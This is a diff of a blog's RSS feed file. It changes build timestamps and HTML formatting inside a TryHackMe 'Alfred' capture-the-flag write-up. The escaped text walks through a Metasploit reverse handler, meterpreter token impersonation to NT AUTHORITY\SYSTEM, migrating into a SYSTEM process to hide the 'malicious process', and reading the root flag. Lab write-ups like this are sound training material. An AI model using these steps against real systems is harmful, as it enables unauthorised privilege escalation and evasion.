@@ -5,8 +5,8 @@
     <description>Burak Baris</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 07 Jan 2022 01:41:49 +0000</pubDate>
-    <lastBuildDate>Fri, 07 Jan 2022 01:41:49 +0000</lastBuildDate>
+    <pubDate>Fri, 07 Jan 2022 01:45:39 +0000</pubDate>
+    <lastBuildDate>Fri, 07 Jan 2022 01:45:39 +0000</lastBuildDate>
     <generator>Jekyll v4.2.1</generator>
     
       <item>
@@ -1099,7 +1099,7 @@ msf6 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST &lt;span class=&quo
 msf6 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THE PORT DECLARED FOR EXECUTABLE BEFORE&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 msf6 run&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;After successfully receiving the meterpreter console, load the incognito module.
 &lt;br /&gt;Run:&lt;/li&gt;
@@ -1123,12 +1123,13 @@ Delegation and impersonation levels are identical locally.&lt;/p&gt;
 &lt;p&gt;If everything were successfully done, &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; should be the output of the &lt;strong&gt;getuid&lt;/strong&gt; command.
 &lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;Run &lt;strong&gt;ps&lt;/strong&gt; to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.
-&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png&quot; alt=&quot;&quot; /&gt;
-By doing that, we have camouflaged our malicious process into a safer looking one.
-&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;To get the root flag, run:&lt;/li&gt;
+  &lt;li&gt;Run &lt;strong&gt;ps&lt;/strong&gt; to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.&lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+By doing that, we have camouflaged our malicious process into a safer looking one.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;To get the root flag, run:&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;onfig&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oot.txt&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
